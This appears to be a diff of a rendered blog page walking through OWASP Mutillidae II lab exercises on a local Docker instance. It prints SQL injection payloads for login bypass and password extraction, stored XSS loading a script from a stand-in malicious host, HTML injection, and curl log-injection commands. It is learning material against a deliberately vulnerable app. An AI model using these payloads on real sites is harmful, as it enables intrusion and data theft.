@@ -11,7 +11,7 @@
 <meta property='og:site_name' content='Home'>
 <meta property='og:type' content='article'><meta property='og:image' content='https://kowalcj0.github.io/img/2018/001/owasp_full_logo.png'><meta property='article:section' content='2018'><meta property='article:tag' content='security'><meta property='article:tag' content='owasp'><meta property='article:tag' content='mutillidae'><meta property='article:tag' content='pentesting'><meta property='article:published_time' content='2018-01-23T14:41:50&#43;01:00'/><meta property='article:modified_time' content='2018-01-23T14:41:50&#43;01:00'/><meta name='twitter:card' content='summary_large_image'><meta property='twitter:image' content='https://kowalcj0.github.io/img/2018/001/owasp_full_logo.png'><meta property='twitter:image:alt' content='OWASP logo. Source: secplicity.org'>
 
-<meta name="generator" content="Hugo 0.82.0" />
+<meta name="generator" content="Hugo 0.90.1" />
 
   <title>Learning web app secuiry with OWASP Mutillidae II - part 1 • Home</title>
   <link rel='canonical' href='https://kowalcj0.github.io/2018/01/23/mutillidae-ii-part-1/'>
@@ -420,26 +420,26 @@
   <div class='container entry-content'>
   <h1 id="installation">iNSTALLATION <a tabindex="0" href="#installation" class="octicon-link" ariaLabel="Anchor"><img src="/img/octicon-link.svg"/></a></h1>
 <p>Run <code>nowasp</code> container:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -p 8888:80 -p 3306:3306 citizenstig/nowasp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -p 8888:80 -p 3306:3306 citizenstig/nowasp
 </code></pre></div><p>Go to <a href="http://localhost:8888/" target="_blank">http://localhost:8888/</a> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 16" width="12" height="16"><path fill-rule="evenodd" d="M11 10h1v3c0 .55-.45 1-1 1H1c-.55 0-1-.45-1-1V3c0-.55.45-1 1-1h3v1H1v10h10v-3zM6 2l2.25 2.25L5 7.5 6.5 9l3.25-3.25L12 8V2H6z"></path></svg>
 , and build the DB.</p>
 <h1 id="excercices">eXCERCICES: <a tabindex="0" href="#excercices" class="octicon-link" ariaLabel="Anchor"><img src="/img/octicon-link.svg"/></a></h1>
 <h2 id="owasp-2013">OWASP 2013 <a tabindex="0" href="#owasp-2013" class="octicon-link" ariaLabel="Anchor"><img src="/img/octicon-link.svg"/></a></h2>
 <h3 id="a1---injection-sql---sqli-extract-data---user-info">A1 - Injection (SQL) - SQLi Extract data - User info <a tabindex="0" href="#a1---injection-sql---sqli-extract-data---user-info" class="octicon-link" ariaLabel="Anchor"><img src="/img/octicon-link.svg"/></a></h3>
 <p>Submit the form with such query in the <code>Name</code> field:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;-- AND &#39;</span>password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;-- AND &#39;</span>password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password&#39;</span>
 </code></pre></div><p>Response should contain:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">Username=admin
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">Username=admin
 Password=adminpass
 Signature=g0t r00t?
 </code></pre></div><h3 id="a1---injection-sql---sqli-bypass-authentication---login">A1 - Injection (SQL) - SQLi Bypass authentication - Login <a tabindex="0" href="#a1---injection-sql---sqli-bypass-authentication---login" class="octicon-link" ariaLabel="Anchor"><img src="/img/octicon-link.svg"/></a></h3>
 <p>You can use the same query in the <code>Name</code> field:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;-- AND &#39;</span>password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;-- AND &#39;</span>password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password&#39;</span>
 </code></pre></div><p>After submitting the query you should see that you&rsquo;re logged in as&hellip;:</p>
-<pre><code>Logged In Admin: admin (g0t r00t?)
+<pre tabindex="0"><code>Logged In Admin: admin (g0t r00t?)
 </code></pre><h3 id="a1---injection-sql---sqli-insert-injection---add-to-your-blog">A1 - Injection (SQL) - SQLi Insert Injection - Add to your blog <a tabindex="0" href="#a1---injection-sql---sqli-insert-injection---add-to-your-blog" class="octicon-link" ariaLabel="Anchor"><img src="/img/octicon-link.svg"/></a></h3>
 <p><em>Stored Cross-Site Scripting</em></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://malicious.site.com/bad.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://malicious.site.com/bad.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
 </code></pre></div><p>Once saved, check your browser&rsquo;s Network requests using e.g. Developer tools:</p>
 <div class="gallery" itemscope itemtype="http://schema.org/ImageGallery">
 
@@ -469,9 +469,9 @@ Signature=g0t r00t?
 <link rel="stylesheet" href="/css/pswp-gallery.css" />
 
 <p>get MySQL version:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;+SUBSTRING(@@version,1,10)+&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;+SUBSTRING(@@version,1,10)+&#39;</span>
 </code></pre></div><p>Red herrings: queries that don&rsquo;t fail but don&rsquo;t give much info back:
-<pre><code class="language-sqk" data-lang="sqk">&#39;+(SELECT IF(1=1,&#39;true&#39;,&#39;false&#39;))+&#39;
+<pre tabindex="0"><code class="language-sqk" data-lang="sqk">&#39;+(SELECT IF(1=1,&#39;true&#39;,&#39;false&#39;))+&#39;
 &#39;+(SELECT password FROM accounts WHERE username=&#34;root&#34;)+&#39;
 &#39;+SUBSTRING((SELECT password FROM accounts WHERE username=&#34;root&#34;),1,10)+&#39;
 &#39;+(SELECT table_name FROM information_schema.tables WHERE table_schema = &#34;nowasp.accounts&#34;)+&#39;
@@ -488,9 +488,9 @@ admin&#39;-- AND SELECT * FROM accounts;</code></pre></p>
 <h3 id="a1---injection-sql---sqli-insert-injection---register-for-an-account">A1 - Injection (SQL) - SQLi Insert Injection - Register for an Account <a tabindex="0" href="#a1---injection-sql---sqli-insert-injection---register-for-an-account" class="octicon-link" ariaLabel="Anchor"><img src="/img/octicon-link.svg"/></a></h3>
 <p>HTMLi -
 add this to the registration signature:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">CANARY</span><span style="color:#960050;background-color:#1e0010">={}&#34;&#34;()&#39;&#39;;#$</span><span style="color:#a6e22e">--</span>/&gt;1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">CANARY</span><span style="color:#960050;background-color:#1e0010">={}&#34;&#34;()&#39;&#39;;#$</span><span style="color:#a6e22e">--</span>/&gt;1
 </code></pre></div><p>or you can use it to plant some XSS:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">CANARY</span><span style="color:#960050;background-color:#1e0010">={}&#34;&#34;()&#39;&#39;;#$</span><span style="color:#a6e22e">--</span>/&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;welcome&#34;</span>);&lt;/<span style="color:#f92672">script</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">CANARY</span><span style="color:#960050;background-color:#1e0010">={}&#34;&#34;()&#39;&#39;;#$</span><span style="color:#a6e22e">--</span>/&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;welcome&#34;</span>);&lt;/<span style="color:#f92672">script</span>&gt;
 </code></pre></div><p>Then log in as newly created user and see that <code>1</code> is visible next to the user name in top menu:</p>
 <div class="gallery" itemscope itemtype="http://schema.org/ImageGallery">
 
@@ -578,16 +578,16 @@ add this to the registration signature:</p>
 <h3 id="a1---injection-sql---sqli-insert-injection---view-captured-data">A1 - Injection (SQL) - SQLi Insert Injection - View Captured Data <a tabindex="0" href="#a1---injection-sql---sqli-insert-injection---view-captured-data" class="octicon-link" ariaLabel="Anchor"><img src="/img/octicon-link.svg"/></a></h3>
 <p>Here&rsquo;s one of my favs: <code>Application Log Injection</code>:<br>
 You can send a dummy HTTP request with <code>User-Agent</code> header containing JS:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://localhost:8888/index.php?page=register.php&#34;</span> -H <span style="color:#e6db74">&#34;User-Agent: &lt;script&gt;alert(&#39;pwnd with Application Log Injection&#39;);&lt;/script&gt;&#34;</span>  &amp;&gt; /dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://localhost:8888/index.php?page=register.php&#34;</span> -H <span style="color:#e6db74">&#34;User-Agent: &lt;script&gt;alert(&#39;pwnd with Application Log Injection&#39;);&lt;/script&gt;&#34;</span>  &amp;&gt; /dev/null
 </code></pre></div><p>or abuse the fact that the <code>endpoint</code> part of the URL is interpretted and logged so that we can include JS in it:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://localhost:8888/&lt;script&gt;alert(&#39;query_param&#39;);&lt;/script&gt;&#34;</span> &amp;&gt; /dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://localhost:8888/&lt;script&gt;alert(&#39;query_param&#39;);&lt;/script&gt;&#34;</span> &amp;&gt; /dev/null
 </code></pre></div><p>Once you send the request, then go to the <a href="http://localhost:8888/index.php?page=show-log.php" target="_blank">http://localhost:8888/index.php?page=show-log.php</a> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 16" width="12" height="16"><path fill-rule="evenodd" d="M11 10h1v3c0 .55-.45 1-1 1H1c-.55 0-1-.45-1-1V3c0-.55.45-1 1-1h3v1H1v10h10v-3zM6 2l2.25 2.25L5 7.5 6.5 9l3.25-3.25L12 8V2H6z"></path></svg>
  the alert pop-ups will appear.</p>
 <p><em>NOTES:</em></p>
 <ul>
 <li>can you create an account for <code>root</code> user???</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://localhost:8888/index.php?page=capture-data.php&amp;showhints=1&#34;</span> -H <span style="color:#e6db74">&#34;PHPSESSID: 5hdie94hhe7cc50pqsbvujqkb3&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://localhost:8888/index.php?page=capture-data.php&amp;showhints=1&#34;</span> -H <span style="color:#e6db74">&#34;PHPSESSID: 5hdie94hhe7cc50pqsbvujqkb3&#34;</span>
 </code></pre></div>
 
 </div>
